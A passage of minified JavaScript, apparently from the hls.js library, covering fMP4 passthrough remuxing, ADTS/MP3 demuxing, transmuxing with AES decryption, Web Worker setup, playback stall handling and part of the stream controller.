`+g_hexDump(n)),t.set(n,8))}))}))}))}return t}(t,n)),this.emitInitSegment=!0}generateInitSegment(t){let{audioCodec:e,videoCodec:r}=this;var n,i;null!=t&&t.byteLength?(n=this.initData=Ht(t),e=e||Dn(n.audio,y),r=r||Dn(n.video,k),i={},n.audio&&n.video?i.audiovideo={container:"video/mp4",codec:e+","+r,initSegment:t,id:"main"}:n.audio?i.audio={container:"audio/mp4",codec:e,initSegment:t,id:"audio"}:n.video?i.video={container:"video/mp4",codec:r,initSegment:t,id:"main"}:V.warn("[passthrough-remuxer.ts]: initSegment does not contain moov or trak boxes."),this.initTracks=i):(this.initTracks=void 0,this.initData=void 0)}remux(r,n,i,a,s,o){let{initPTS:l,lastEndTime:u}=this;var h={audio:void 0,video:void 0,text:a,id3:i,initSegment:void 0};if(null!=(n=(N(u)||(u=this.lastEndTime=s||0),n.samples))&&n.length){var c={initPTS:void 0,timescale:1};let e=this.initData;if(null!=(g=e)&&g.length||(this.generateInitSegment(n),e=this.initData),null!=(g=e)&&g.length){this.emitInitSegment&&(c.tracks=this.initTracks,this.emitInitSegment=!1);var d,f,p,g=function Wt(t,e){let r=0,n=0,i=0;var a=w(t,["moof","traf"]);for(let t=0;t<a.length;t++){var s=a[t],o=w(s,["tfhd"])[0],l=e[R(o,4)];if(l){var u=l.default,h=R(o,0)|(null==u?void 0:u.flags);let e=null==u?void 0:u.duration;8&h&&(e=R(o,2&h?12:8));var d=l.timescale||9e4,f=w(s,["trun"]);for(let t=0;t<f.length;t++)!(r=function(e){var r=R(e,0);let n=8;1&r&&(n+=4),4&r&&(n+=4);let i=0;var a=R(e,4);for(let t=0;t<a;t++)256&r&&(i+=R(e,n),n+=4),512&r&&(n+=4),1024&r&&(n+=4),2048&r&&(n+=4);return i}(f[t]))&&e&&(r=e*R(f[t],4)),l.type===k?n+=r/d:l.type===y&&(i+=r/d)}}if(0!==n||0!==i)return n||i;{let e=0;var p=w(t,["sidx"]);for(let t=0;t<p.length;t++){var g=function(e){var r=[],t=e[0];let n=8;var i=R(e,n);n=(n+=4)+(0===t?8:16)+2;let a=e.length+0;var s=Gt(e,n);n+=2;for(let t=0;t<s;t++){var o=n,l=R(e,o),u=(o+=4,2147483647&l);if(1==(2147483648&l)>>>31)return V.warn("SIDX has hierarchical references (not supported)"),null;l=R(e,o),o+=4,r.push({referenceSize:u,subsegmentDuration:l,info:{duration:l/i,start:a,end:a+u-1}}),a+=u,n=o+=4}return{earliestPresentationTime:0,timescale:i,version:t,referencesCount:s,references:r}}(p[t]);null!=g&&g.references&&(e+=g.references.reduce(((t,e)=>t+e.info.duration||0),0))}return e}}(n,e),v=(d=e,w(n,["moof","traf"]).reduce(((t,e)=>{const n=w(e,["tfdt"])[0],i=n[0];return e=w(e,["tfhd"]).reduce(((e,r)=>{if(r=R(r,4),r=d[r]){let t=R(n,4);if(1===i){if(t===Bt)return V.warn("[mp4-demuxer]: Ignoring assumed invalid signed 64-bit track fragment decode time"),e;t=(t*=1+Bt)+R(n,8)}if(r=r.timescale||9e4,N(r=t/r)&&(null===e||r<e))return r}return e}),null),null!==e&&N(e)&&(null===t||e<t)?e:t}),null));o=((function(t,e,r,n){return null===t?1:(n=Math.max(n,1),e-=t.baseTime/t.timescale,Math.abs(e-r)>n)}(l,v=null===v?s:v,s,g)||c.timescale!==l.timescale&&o)&&(c.initPTS=v-s,l&&1===l.timescale&&V.warn("Adjusting initPTS by "+(c.initPTS-l.baseTime)),this.initPTS=l={baseTime:c.initPTS,timescale:1}),r?v-l.baseTime/l.timescale:u),r=o+g,v=(f=e,p=l.baseTime/l.timescale,w(n,["moof","traf"]).forEach((e=>{w(e,["tfhd"]).forEach((t=>{if(t=R(t,4),t=f[t]){const i=t.timescale||9e4;w(e,["tfdt"]).forEach((t=>{var e,r=t[0];let n=R(t,4);0===r?(n-=p*i,Kt(t,4,n=Math.max(n,0))):(n=(n=(n*=Math.pow(2,32))+R(t,8))-p*i,n=Math.max(n,0),r=Math.floor(n/(1+Bt)),e=Math.floor(n%(1+Bt)),Kt(t,4,r),Kt(t,8,e))}))}}))})),0<g?this.lastEndTime=r:(V.warn("Duration parsed from mp4 should be greater than zero"),this.resetNextTimestamp()),!!e.audio);let t="";v&&(t+="audio"),(g=!!e.video)&&(t+="video"),n={data1:n,startPTS:o,startDTS:o,endPTS:r,endDTS:r,type:t,hasAudio:v,hasVideo:g,nb:1,dropped:0},h.audio="audio"===n.type?n:void 0,h.video="audio"!==n.type?n:void 0,h.initSegment=c,h.id3=kn(i,s,l,l),a.samples.length&&(h.text=Rn(a,s,l))}else V.warn("[passthrough-remuxer.ts]: Failed to generate initSegment.")}return h}}},{demux:fn,remux:Ln},{demux:class extends Vr{constructor(t,e){super(),this.observer=void 0,this.config=void 0,this.observer=t,this.config=e}resetInitSegment(t,e,r,n){super.resetInitSegment(t,e,r,n),this._audioTrack={container:"audio/adts",type:"audio",id:2,pid:-1,sequenceNumber:0,segmentCodec:"aac",samples:[],manifestCodec:e,duration:n,inputTimeScale:9e4,dropped:0}}static probe(e){if(e){let t=(It(e,0)||[]).length;for(var r,n,i,a,s=e.length;t<s;t++)if(a=i=void 0,!Qr(r=e,n=t)||n+(a=qr(r,n))>=r.length?void 0:!((i=zr(r,n))<=a)&&((a=n+i)===r.length||Qr(r,a)))return V.log("ADTS sync word found !"),!0}return!1}canParse(t,e){return e+5<t.length&&Yr(t,e)&&zr(t,e)<=t.length-e}appendFrame(t,e,r){if(Xr(t,this.observer,e,r,t.manifestCodec),(t=Zr(t,e,r,this.basePTS,this.frameIndex))&&0===t.missing)return t}},remux:Ln},{demux:class extends Vr{resetInitSegment(t,e,r,n){super.resetInitSegment(t,e,r,n),this._audioTrack={container:"audio/mpeg",type:"audio",id:2,pid:-1,sequenceNumber:0,segmentCodec:"mp3",samples:[],manifestCodec:e,duration:n,inputTimeScale:9e4,dropped:0}}static probe(e){if(e){let t=(It(e,0)||[]).length;for(var r=e.length;t<r;t++)if(function(e,r){if(r+1<e.length&&un(e,r)){var n=ln(e,r);let t=4;return(r+=t=null!=n&&n.frameLength?n.frameLength:t)===e.length||hn(e,r)}}(e,t))return V.log("MPEG Audio sync word found !"),!0}return!1}canParse(t,e){return un(t,e)&&4<=t.length-e}appendFrame(t,e,r){if(null!==this.basePTS)return on(t,e,r,this.basePTS,this.frameIndex)}},remux:Ln}];class xn{constructor(t,e,r,n,i){this.async=!1,this.observer=void 0,this.typeSupported=void 0,this.config=void 0,this.vendor=void 0,this.id=void 0,this.demuxer=void 0,this.remuxer=void 0,this.decrypter=void 0,this.probe=void 0,this.decryptionPromise=null,this.transmuxConfig=void 0,this.currentTransmuxState=void 0,this.observer=t,this.typeSupported=e,this.config=r,this.vendor=n,this.id=i}configure(t){this.transmuxConfig=t,this.decrypter&&this.decrypter.reset()}push(t,e,r,n){var i=r.transmuxing;i.executeStart=Cn();let a=new Uint8Array(t);var{currentTransmuxState:t,transmuxConfig:s}=this,{contiguous:n,discontinuity:t,trackSwitch:o,accurateTimeOffset:l,timeOffset:u,initSegmentChange:h}=(n&&(this.currentTransmuxState=n),n||t),{audioCodec:s,videoCodec:c,defaultInitPts:d,duration:f,initSegmentData:p}=s,g=function(t,e){let r=null;return 0<t.byteLength&&null!=e&&null!=e.key&&null!==e.iv&&null!=e.method&&(r=e),r}(a,e);if(g&&"AES-128"===g.method){var v=this.getDecrypter();if(!v.isSync())return this.decryptionPromise=v.webCryptoDecrypt(a,g.key.buffer,g.iv.buffer).then((t=>(t=this.push(t,null,r),this.decryptionPromise=null,t))),this.decryptionPromise;{let t=v.softwareDecrypt(a,g.key.buffer,g.iv.buffer);var m=-1<r.part;if(!(t=m?v.flush():t))return i.executeEnd=Cn(),On(r);a=new Uint8Array(t)}}return(m=this.needsProbing(t,o))&&(v=this.configureTransmuxer(a))?(V.warn("[transmuxer] "+v.message),this.observer.emit($.ERROR,$.ERROR,{type:K.MEDIA_ERROR,details:H.FRAG_PARSING_ERROR,fatal:!1,error:v,reason:v.message}),i.executeEnd=Cn(),On(r)):((t||o||h||m)&&this.resetInitSegment(p,s,c,f,e),(t||h||m)&&this.resetInitialTimestamp(d),n||this.resetContiguity(),v=this.transmux(a,g,u,l,r),(o=this.currentTransmuxState).contiguous=!0,o.discontinuity=!1,o.trackSwitch=!1,i.executeEnd=Cn(),v)}flush(e){var t=e.transmuxing,{decrypter:r,currentTransmuxState:n,decryptionPromise:i}=(t.executeStart=Cn(),this);if(i)return i.then((()=>this.flush(e)));const a=[];var i=n.timeOffset,{demuxer:r,remuxer:n}=(r&&(n=r.flush())&&a.push(this.push(n,null,e)),this);return r&&n?Mn(n=r.flush(i))?n.then((t=>(this.flushRemux(a,t,e),a))):(this.flushRemux(a,n,e),a):(t.executeEnd=Cn(),[On(e)])}flushRemux(t,e,r){var{audioTrack:e,videoTrack:n,id3Track:i,textTrack:a}=e,{accurateTimeOffset:s,timeOffset:o}=this.currentTransmuxState;V.log(`[transmuxer.ts]: Flushed fragment ${r.sn}${-1<r.part?" p: "+r.part:""} of level `+r.level),e=this.remuxer.remux(e,n,i,a,o,s,!0,this.id);t.push({remuxResult:e,chunkMeta:r}),r.transmuxing.executeEnd=Cn()}resetInitialTimestamp(t){var{demuxer:e,remuxer:r}=this;e&&r&&(e.resetTimeStamp(t),r.resetTimeStamp(t))}resetContiguity(){var{demuxer:t,remuxer:e}=this;t&&e&&(t.resetContiguity(),e.resetNextTimestamp())}resetInitSegment(t,e,r,n,i){var{demuxer:a,remuxer:s}=this;a&&s&&(a.resetInitSegment(t,e,r,n),s.resetInitSegment(t,e,r,i))}destroy(){this.demuxer&&(this.demuxer.destroy(),this.demuxer=void 0),this.remuxer&&(this.remuxer.destroy(),this.remuxer=void 0)}transmux(t,e,r,n,i){return e&&"SAMPLE-AES"===e.method?this.transmuxSampleAes(t,e,r,n,i):this.transmuxUnencrypted(t,r,n,i)}transmuxUnencrypted(t,e,r,n){var{audioTrack:t,videoTrack:i,id3Track:a,textTrack:s}=this.demuxer.demux(t,e,!1,!this.config.progressive);return{remuxResult:this.remuxer.remux(t,i,a,s,e,r,!1,this.id),chunkMeta:n}}transmuxSampleAes(t,e,r,n,i){return this.demuxer.demuxSampleAes(t,e,r).then((t=>({remuxResult:this.remuxer.remux(t.audioTrack,t.videoTrack,t.id3Track,t.textTrack,r,n,!1,this.id),chunkMeta:i})))}configureTransmuxer(r){var{config:t,observer:e,typeSupported:n,vendor:i}=this;let a;for(let t=0,e=Pn.length;t<e;t++)if(Pn[t].demux.probe(r)){a=Pn[t];break}if(!a)return new Error("Failed to find demuxer by probing fragment data");var s=this.demuxer,o=this.remuxer,l=a.remux,u=a.demux;o&&o instanceof l||(this.remuxer=new l(e,t,n,i)),s&&s instanceof u||(this.demuxer=new u(e,t,n),this.probe=u.probe)}needsProbing(t,e){return!this.demuxer||!this.remuxer||t||e}getDecrypter(){let t=this.decrypter;return t||(this.decrypter=new Gr(this.config))}}const On=t=>({remuxResult:{},chunkMeta:t});function Mn(t){return"then"in t&&t.then instanceof Function}class Fn{constructor(t,e,r,n,i){this.audioCodec=void 0,this.videoCodec=void 0,this.initSegmentData=void 0,this.duration=void 0,this.defaultInitPts=void 0,this.audioCodec=t,this.videoCodec=e,this.initSegmentData=r,this.duration=n,this.defaultInitPts=i||null}}class Nn{constructor(t,e,r,n,i,a){this.discontinuity=void 0,this.contiguous=void 0,this.accurateTimeOffset=void 0,this.trackSwitch=void 0,this.timeOffset=void 0,this.initSegmentChange=void 0,this.discontinuity=t,this.contiguous=e,this.accurateTimeOffset=r,this.trackSwitch=n,this.timeOffset=i,this.initSegmentChange=a}}var Bn,D;function Un(){}function jn(t,e,r){this.fn=t,this.context=e,this.once=r||!1}function Gn(t,e,r,n,i){if("function"!=typeof r)throw new TypeError("The listener must be a function");return r=new jn(r,n||t,i),n=D?D+e:e,t._events[n]?t._events[n].fn?t._events[n]=[t._events[n],r]:t._events[n].push(r):(t._events[n]=r,t._eventsCount++),t}function $n(t,e){0==--t._eventsCount?t._events=new Un:delete t._events[e]}function r(){this._events=new Un,this._eventsCount=0}e=t={exports:{}},Bn=Object.prototype.hasOwnProperty,D="~",Object.create&&(Un.prototype=Object.create(null),(new Un).__proto__||(D=!1)),r.prototype.eventNames=function(){var t,e,r=[];if(0===this._eventsCount)return r;for(e in t=this._events)Bn.call(t,e)&&r.push(D?e.slice(1):e);return Object.getOwnPropertySymbols?r.concat(Object.getOwnPropertySymbols(t)):r},r.prototype.listeners=function(t){t=D?D+t:t;var e=this._events[t];if(!e)return[];if(e.fn)return[e.fn];for(var r=0,n=e.length,i=new Array(n);r<n;r++)i[r]=e[r].fn;return i},r.prototype.listenerCount=function(t){return t=D?D+t:t,(t=this._events[t])?t.fn?1:t.length:0},r.prototype.emit=function(t,e,r,n,i,a){var s=D?D+t:t;if(!this._events[s])return!1;var o,l=this._events[s],u=arguments.length;if(l.fn){switch(l.once&&this.removeListener(t,l.fn,void 0,!0),u){case 1:return l.fn.call(l.context),!0;case 2:return l.fn.call(l.context,e),!0;case 3:return l.fn.call(l.context,e,r),!0;case 4:return l.fn.call(l.context,e,r,n),!0;case 5:return l.fn.call(l.context,e,r,n,i),!0;case 6:return l.fn.call(l.context,e,r,n,i,a),!0}for(d=1,o=new Array(u-1);d<u;d++)o[d-1]=arguments[d];l.fn.apply(l.context,o)}else for(var h,c=l.length,d=0;d<c;d++)switch(l[d].once&&this.removeListener(t,l[d].fn,void 0,!0),u){case 1:l[d].fn.call(l[d].context);break;case 2:l[d].fn.call(l[d].context,e);break;case 3:l[d].fn.call(l[d].context,e,r);break;case 4:l[d].fn.call(l[d].context,e,r,n);break;default:if(!o)for(h=1,o=new Array(u-1);h<u;h++)o[h-1]=arguments[h];l[d].fn.apply(l[d].context,o)}return!0},r.prototype.on=function(t,e,r){return Gn(this,t,e,r,!1)},r.prototype.once=function(t,e,r){return Gn(this,t,e,r,!0)},r.prototype.removeListener=function(t,e,r,n){if(t=D?D+t:t,this._events[t])if(e){var i=this._events[t];if(i.fn)i.fn!==e||n&&!i.once||r&&i.context!==r||$n(this,t);else{for(var a=0,s=[],o=i.length;a<o;a++)(i[a].fn!==e||n&&!i[a].once||r&&i[a].context!==r)&&s.push(i[a]);s.length?this._events[t]=1===s.length?s[0]:s:$n(this,t)}}else $n(this,t);return this},r.prototype.removeAllListeners=function(t){return t?(t=D?D+t:t,this._events[t]&&$n(this,t)):(this._events=new Un,this._eventsCount=0),this},r.prototype.off=r.prototype.removeListener,r.prototype.addListener=r.prototype.on,r.prefixed=D,e.exports=r.EventEmitter=r;var Kn=function M(t){return t&&t.__esModule&&Object.prototype.hasOwnProperty.call(t,"default")?t.default:t}(t.exports);const Hn=ie()||{isTypeSupported:()=>!1};class Vn{constructor(t,e,r,n){this.error=null,this.hls=void 0,this.id=void 0,this.observer=void 0,this.frag=null,this.part=null,this.useWorker=void 0,this.workerContext=null,this.onwmsg=void 0,this.transmuxer=null,this.onTransmuxComplete=void 0,this.onFlush=void 0;const i=t.config;this.hls=t,this.id=e,this.useWorker=!!i.enableWorker,this.onTransmuxComplete=r,this.onFlush=n;var a,s;t=(t,e)=>{(e=e||{}).frag=this.frag,e.id=this.id,t===$.ERROR&&(this.error=e.error),this.hls.trigger(t,e)},this.observer=new Kn,this.observer.on($.FRAG_DECRYPTED,t),this.observer.on($.ERROR,t),r={mp4:Hn.isTypeSupported("video/mp4"),mpeg:Hn.isTypeSupported("audio/mpeg"),mp3:Hn.isTypeSupported('audio/mp4; codecs="mp3"')},n=navigator.vendor;if(!this.useWorker||"undefined"==typeof Worker||!i.workerPath&&"function"!=typeof __HLS_WORKER_BUNDLE__)this.transmuxer=new xn(this.observer,r,i,n,e);else try{i.workerPath?(V.log(`loading Web Worker ${i.workerPath} for "${e}"`),this.workerContext=(s=i.workerPath,s=new self.URL(s,self.location.href).href,{worker:new self.Worker(s),scriptURL:s})):(V.log(`injecting Web Worker for "${e}"`),this.workerContext=(a=new self.Blob([`var exports={};var module={exports:exports};function define(f){f()};define.amd=true;(${__HLS_WORKER_BUNDLE__.toString()})(true);`],{type:"text/javascript"}),a=self.URL.createObjectURL(a),{worker:new self.Worker(a),objectURL:a})),this.onwmsg=t=>this.onWorkerMessage(t);var o=this.workerContext.worker;o.addEventListener("message",this.onwmsg),o.onerror=t=>{t=new Error(`${t.message}  (${t.filename}:${t.lineno})`),i.enableWorker=!1,V.warn(`Error in "${e}" Web Worker, fallback to inline`),this.hls.trigger($.ERROR,{type:K.OTHER_ERROR,details:H.INTERNAL_EXCEPTION,fatal:!1,event:"demuxerWorker",error:t})},o.postMessage({cmd:"init",typeSupported:r,vendor:n,id:e,config:JSON.stringify(i)})}catch(t){V.warn(`Error setting up "${e}" Web Worker, fallback to inline`,t),this.resetWorker(),this.error=null,this.transmuxer=new xn(this.observer,r,i,n,e)}}resetWorker(){var t,e;this.workerContext&&(({worker:t,objectURL:e}=this.workerContext),e&&self.URL.revokeObjectURL(e),t.removeEventListener("message",this.onwmsg),t.onerror=null,t.terminate(),this.workerContext=null)}destroy(){this.workerContext?(this.resetWorker(),this.onwmsg=void 0):(t=this.transmuxer)&&(t.destroy(),this.transmuxer=null);var t=this.observer;t&&t.removeAllListeners(),this.frag=null,this.observer=null,this.hls=null}push(t,e,r,n,i,a,s,o,l,u){var h=(l.transmuxing.start=self.performance.now(),this).transmuxer,c=(a||i).start,d=i.decryptdata,f=this.frag,p=!(f&&i.cc===f.cc),g=!(f&&l.level===f.level),v=f?l.sn-f.sn:-1,m=this.part?l.part-this.part.index:-1,y=0==v&&1<l.id&&l.id===(null==f?void 0:f.stats.chunkCount),E=(y=!g&&(1==v||0==v&&(1==m||y&&m<=0)),self.performance.now());(g||v||0===i.stats.parsing.start)&&(i.stats.parsing.start=E),!a||!m&&y||(a.stats.parsing.start=E),E=!(f&&(null==(v=i.initSegment)?void 0:v.url)===(null==(m=f.initSegment)?void 0:m.url)),v=new Nn(p,y,o,g,c,E);y&&!p&&!E||(V.log(`[transmuxer-interface, ${i.type}]: Starting new transmux session for sn: ${l.sn} p: ${l.part} level: ${l.level} id: ${l.id}\n        discontinuity: ${p}\n        trackSwitch: ${g}\n        contiguous: ${y}\n        accurateTimeOffset: ${o}\n        timeOffset: ${c}\n        initSegmentChange: `+E),f=new Fn(r,n,e,s,u),this.configureTransmuxer(f)),this.frag=i,this.part=a,this.workerContext?this.workerContext.worker.postMessage({cmd:"demux",data:t,decryptdata:d,chunkMeta:l,state:v},t instanceof ArrayBuffer?[t]:[]):h&&(Mn(m=h.push(t,d,l,v))?(h.async=!0,m.then((t=>{this.handleTransmuxComplete(t)})).catch((t=>{this.transmuxerError(t,l,"transmuxer-interface push error")}))):(h.async=!1,this.handleTransmuxComplete(m)))}flush(e){e.transmuxing.start=self.performance.now();var r=this.transmuxer;if(this.workerContext)this.workerContext.worker.postMessage({cmd:"flush",chunkMeta:e});else if(r){let t=r.flush(e);Mn(t)||r.async?(t=Mn(t)?t:Promise.resolve(t)).then((t=>{this.handleFlushResult(t,e)})).catch((t=>{this.transmuxerError(t,e,"transmuxer-interface flush error")})):this.handleFlushResult(t,e)}}transmuxerError(t,e,r){this.hls&&(this.error=t,this.hls.trigger($.ERROR,{type:K.MEDIA_ERROR,details:H.FRAG_PARSING_ERROR,chunkMeta:e,fatal:!1,error:t,err:t,reason:r}))}handleFlushResult(t,e){t.forEach((t=>{this.handleTransmuxComplete(t)})),this.onFlush(e)}onWorkerMessage(t){var e=t.data,r=this.hls;switch(e.event){case"init":var n=null==(n=this.workerContext)?void 0:n.objectURL;n&&self.URL.revokeObjectURL(n);break;case"transmuxComplete":this.handleTransmuxComplete(e.data);break;case"flush":this.onFlush(e.data);break;case"workerLog":V[e.data.logType]&&V[e.data.logType](e.data.message);break;default:e.data=e.data||{},e.data.frag=this.frag,e.data.id=this.id,r.trigger(e.event,e.data)}}configureTransmuxer(t){var e=this.transmuxer;this.workerContext?this.workerContext.worker.postMessage({cmd:"configure",config:t}):e&&e.configure(t)}handleTransmuxComplete(t){t.chunkMeta.transmuxing.end=self.performance.now(),this.onTransmuxComplete(t)}}class Wn{constructor(t,e,r,n){this.config=void 0,this.media=null,this.fragmentTracker=void 0,this.hls=void 0,this.nudgeRetry=0,this.stallReported=!1,this.stalled=null,this.moved=!1,this.seeking=!1,this.config=t,this.media=e,this.fragmentTracker=r,this.hls=n}destroy(){this.media=null,this.hls=this.fragmentTracker=null}poll(t,e){var{config:r,media:n,stalled:i}=this;if(null!==n){var{currentTime:a,seeking:s}=n,o=this.seeking&&!s,l=!this.seeking&&s;if(this.seeking=s,a!==t)this.moved=!0,null!==i&&(this.stallReported&&(t=self.performance.now()-i,V.warn(`playback not stuck anymore @${a}, after ${Math.round(t)}ms`),this.stallReported=!1),this.stalled=null,this.nudgeRetry=0);else if(l||o)this.stalled=null;else if(!(n.paused&&!s||n.ended||0===n.playbackRate)&&S.getBuffered(n).length&&(l=0<(t=S.bufferInfo(n,a,0)).len,o=t.nextStart||0,l||o)){if(s){if(l=2<t.len,e=!o||e&&e.start<=a||2<o-a&&!this.fragmentTracker.getPartialFragment(a),l||e)return;this.moved=!1}if(!this.moved&&null!==this.stalled&&(l=Math.max(o,t.start||0)-a,o=(null==(e=this.hls.levels?this.hls.levels[this.hls.currentLevel]:null)||null==(o=e.details)?void 0:o.live)?2*e.details.targetduration:2,e=this.fragmentTracker.getPartialFragment(a),0<l&&(l<=o||e)))return void this._trySkipBufferHole(e);l=self.performance.now(),null===i?this.stalled=l:(o=l-i,!s&&250<=o&&(this._reportStall(t),!this.media)||(e=S.bufferInfo(n,a,r.maxBufferHole),this._tryFixBufferStall(e,o)))}}}_tryFixBufferStall(t,e){var{config:r,fragmentTracker:n,media:i}=this;if(null!==i){if(i=i.currentTime,(n=n.getPartialFragment(i))&&(this._trySkipBufferHole(n)||!this.media))return;(t.len>r.maxBufferHole||t.nextStart&&t.nextStart-i<r.maxBufferHole)&&e>1e3*r.highBufferWatchdogPeriod&&(V.warn("Trying to nudge playhead over buffer-hole"),this.stalled=null,this._tryNudgeBuffer())}}_reportStall(t){var{hls:e,media:r,stallReported:n}=this;!n&&r&&(this.stallReported=!0,n=new Error(`Playback stalling at @${r.currentTime} due to low buffer (${JSON.stringify(t)})`),V.warn(n.message),e.trigger($.ERROR,{type:K.MEDIA_ERROR,details:H.BUFFER_STALLED_ERROR,fatal:!1,error:n,buffer:t.len}))}_trySkipBufferHole(e){var{config:t,hls:r,media:n}=this;if(null!==n){var i=n.currentTime,s=i<(a=S.bufferInfo(n,i,0)).start?a.start:a.nextStart;if(s){var o=a.len<=t.maxBufferHole,a=0<a.len&&a.len<1&&n.readyState<3,l=s-i;if(0<l&&(o||a)){if(l>t.maxBufferHole){var u=this.fragmentTracker;let t=!1;if(!(t=!!(0===i&&(o=u.getAppendedFrag(0,A))&&s<o.end)||t)&&(a=e||u.getAppendedFrag(i,A))){let t=!1,e=a.end;for(;e<s;){var h=u.getPartialFragment(e);if(!h){t=!0;break}e+=h.duration}if(t)return 0}}return l=Math.max(s+.05,i+.1),V.warn(`skipping hole, adjusting currentTime from ${i} to `+l),this.moved=!0,this.stalled=null,n.currentTime=l,e&&!e.gap&&(t=new Error(`fragment loaded with buffer holes, seeking from ${i} to `+l),r.trigger($.ERROR,{type:K.MEDIA_ERROR,details:H.BUFFER_SEEK_OVER_HOLE,fatal:!1,error:t,reason:t.message,frag:e})),l}}}return 0}_tryNudgeBuffer(){var t,e,{config:r,hls:n,media:i,nudgeRetry:a}=this;null!==i&&(t=i.currentTime,this.nudgeRetry++,a<r.nudgeMaxRetry?(a=t+(a+1)*r.nudgeOffset,e=new Error(`Nudging 'currentTime' from ${t} to `+a),V.warn(e.message),i.currentTime=a,n.trigger($.ERROR,{type:K.MEDIA_ERROR,details:H.BUFFER_NUDGE_ON_STALL,error:e,fatal:!1})):(i=new Error(`Playhead still not moving while enough data buffered @${t} after ${r.nudgeMaxRetry} nudges`),V.error(i.message),n.trigger($.ERROR,{type:K.MEDIA_ERROR,details:H.BUFFER_STALLED_ERROR,error:i,fatal:!0})))}}class Yn extends Kr{constructor(t,e,r){super(t,e,r,"[stream-controller]",A),this.audioCodecSwap=!1,this.gapController=null,this.level=-1,this._forceStartLoad=!1,this.altAudio=!1,this.audioOnly=!1,this.fragPlaying=null,this.onvplaying=null,this.onvseeked=null,this.fragLastKbps=0,this.couldBacktrack=!1,this.backtrackFragment=null,this.audioCodecSwitch=!1,this.videoBuffer=null,this._registerListeners()}_registerListeners(){var t=this.hls;t.on($.MEDIA_ATTACHED,this.onMediaAttached,this),t.on($.MEDIA_DETACHING,this.onMediaDetaching,this),t.on($.MANIFEST_LOADING,this.onManifestLoading,this),t.on($.MANIFEST_PARSED,this.onManifestParsed,this),t.on($.LEVEL_LOADING,this.onLevelLoading,this),t.on($.LEVEL_LOADED,this.onLevelLoaded,this),t.on($.FRAG_LOAD_EMERGENCY_ABORTED,this.onFragLoadEmergencyAborted,this),t.on($.ERROR,this.onError,this),t.on($.AUDIO_TRACK_SWITCHING,this.onAudioTrackSwitching,this),t.on($.AUDIO_TRACK_SWITCHED,this.onAudioTrackSwitched,this),t.on($.BUFFER_CREATED,this.onBufferCreated,this),t.on($.BUFFER_FLUSHED,this.onBufferFlushed,this),t.on($.LEVELS_UPDATED,this.onLevelsUpdated,this),t.on($.FRAG_BUFFERED,this.onFragBuffered,this)}_unregisterListeners(){var t=this.hls;t.off($.MEDIA_ATTACHED,this.onMediaAttached,this),t.off($.MEDIA_DETACHING,this.onMediaDetaching,this),t.off($.MANIFEST_LOADING,this.onManifestLoading,this),t.off($.MANIFEST_PARSED,this.onManifestParsed,this),t.off($.LEVEL_LOADED,this.onLevelLoaded,this),t.off($.FRAG_LOAD_EMERGENCY_ABORTED,this.onFragLoadEmergencyAborted,this),t.off($.ERROR,this.onError,this),t.off($.AUDIO_TRACK_SWITCHING,this.onAudioTrackSwitching,this),t.off($.AUDIO_TRACK_SWITCHED,this.onAudioTrackSwitched,this),t.off($.BUFFER_CREATED,this.onBufferCreated,this),t.off($.BUFFER_FLUSHED,this.onBufferFlushed,this),t.off($.LEVELS_UPDATED,this.onLevelsUpdated,this),t.off($.FRAG_BUFFERED,this.onFragBuffered,this)}onHandlerDestroying(){this._unregisterListeners(),this.onMediaDetaching()}startLoad(t){if(this.levels){var{lastCurrentTime:e,hls:r}=this;if(this.stopLoad(),this.setInterval(100),this.level=-1,!this.startFragRequested){let t=r.startLevel;-1===t&&(r.config.testBandwidth&&1<this.levels.length?(t=0,this.bitrateTest=!0):t=r.nextAutoLevel),this.level=r.nextLoadLevel=t,this.loadedmetadata=!1}0<e&&-1===t&&(this.log("Override startPosition with lastCurrentTime @"+e.toFixed(3)),t=e),this.state=L_IDLE,this.nextLoadPosition=this.startPosition=this.lastCurrentTime=t,this.tick()}else this._forceStartLoad=!0,this.state=L_STOPPED}stopLoad(){this._forceStartLoad=!1,super.stopLoad()}doTick(){switch(this.state){case L_WAITING_LEVEL:var e,{levels:t,level:e}=this;if(!(e=null==t||null==(t=t[e])?void 0:t.details)||e.live&&this.levelLastLoaded!==this.level)this.hls.nextLoadLevel!==this.level&&(this.state=L_IDLE);else{if(this.waitForCdnTuneIn(e))break;this.state=L_IDLE}break;case L_FRAG_LOADING_WAITING_RETRY:t=self.performance.now(),(!(e=this.retryDate)||e<=t||null!=(e=this.media)&&e.seeking)&&(this.resetStartWhenNotLoaded(this.level),this.state=L_IDLE)}this.state===L_IDLE&&this.doTickIdle(),this.onTickEnd()}onTickEnd(){super.onTickEnd(),this.checkBuffer(),this.checkFragmentChanged()}doTickIdle(){var{hls:e,levelLastLoaded:r,levels:n,media:i}=this,{config:a,nextLoadLevel:s}=e;if(null!==r&&(i||!this.startFragRequested&&a.startFragPrefetch)&&(!this.altAudio||!this.audioOnly)&&null!=n&&n[s]&&(r=n[s],null!==(i=this.getMainFwdBufferInfo())))if((a=this.getLevelDetails())&&this._streamEnded(i,a))n={},this.altAudio&&(n.type="video"),this.hls.trigger($.BUFFER_EOS,n),this.state=L_ENDED;else if(e.loadLevel!==s&&-1===e.manualLevel&&this.log(`Adapting to level ${s} from level `+this.level),this.level=e.nextLoadLevel=s,!(a=r.details)||this.state===L_WAITING_LEVEL||a.live&&this.levelLastLoaded!==s)this.level=s,this.state=L_WAITING_LEVEL;else if(n=i.len,!((e=this.getMaxBufferLength(r.maxBitrate))<=n)){this.backtrackFragment&&this.backtrackFragment.start>i.end&&(this.backtrackFragment=null);var o,s=this.backtrackFragment?this.backtrackFragment.start:i.end;let t=this.getNextFragment(s,a);this.couldBacktrack&&!this.fragPrevious&&t&&"initSegment"!==t.sn&&this.fragmentTracker.getState(t)!==Tr?(n=(null!=(n=this.backtrackFragment)?n:t).sn-a.startSN,(n=a.fragments[n-1])&&t.cc===n.cc&&(t=n,this.fragmentTracker.removeFragment(n))):this.backtrackFragment&&i.len&&(this.backtrackFragment=null),t&&this.isLoopLoading(t,s)&&(t.gap||(o=((n=this.audioOnly&&!this.altAudio?y:k)===k?this.videoBuffer:this.mediaBuffer)||this.media)&&this.afterBufferFlushed(o,n,A),t=this.getNextFragmentLoopLoading(t,a,i,A,e)),t&&(!t.initSegment||t.initSegment.data||this.bitrateTest||(t=t.initSegment),this.loadFragment(t,r,s))}}loadFragment(t,e,r){var n=this.fragmentTracker.getState(t);this.fragCurrent=t,n===mr||n===Er?"initSegment"===t.sn?this._loadInitSegment(t,e):this.bitrateTest?(this.log(`Fragment ${t.sn} of level ${t.level} is being downloaded to test bitrate and will not be 